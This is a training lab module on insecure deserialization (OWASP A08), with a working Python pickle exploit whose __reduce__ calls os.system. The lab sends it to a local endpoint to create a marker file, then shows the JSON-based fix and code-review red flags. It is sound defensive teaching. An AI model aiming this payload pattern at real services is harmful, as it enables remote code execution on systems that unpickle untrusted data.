# 08 — Insecure Deserialization — OWASP A08

## Theory

Serialization turns an object into bytes to store/send; deserialization turns
bytes back into an object. If you deserialize **attacker-controlled** bytes with
an unsafe format, the attacker can make your program run their code during the
conversion — **remote code execution (RCE)**, the worst outcome.

In Python the danger is `pickle.loads()`. Equivalents: unsafe `yaml.load`, Java
native serialization. Fix: **never deserialize untrusted data with pickle/yaml**.
Use a data-only format (JSON). If a rich format is unavoidable, sign the data and
verify before parsing, and restrict allowed types.

## Lab

App running (appsec-lab, module 00). Second terminal:

```bash
python3 - <<'PY'
import base64, pickle, os, urllib.request
marker = "/tmp/pwned_demo"
if os.path.exists(marker): os.remove(marker)
class Exploit:
    def __reduce__(self):            # runs during pickle.loads
        return (os.system, (f"touch {marker}",))
payload = base64.b64encode(pickle.dumps(Exploit()))
urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:5000/prefs", data=payload))
print("code executed on server:", os.path.exists(marker))
PY
```

It prints `True` — your payload ran a command on the server (it created the
marker file). That's RCE via deserialization.

Fix — restart secure (`Ctrl+C`, then `LAB_SECURE=1 python3 run_server.py`) and
re-run: the endpoint uses JSON and rejects the pickle (`400`), no code runs.

## Verify

- Insecure: `code executed on server: True` (marker created).
- Secure: request rejected; no marker.

## Key takeaways

- `pickle.loads` on untrusted data = RCE. So does unsafe `yaml.load`.
- Fix = JSON (data only). Never unpickle untrusted input.
- Code-review red flag: `pickle.loads(`, `yaml.load(` without `SafeLoader`.
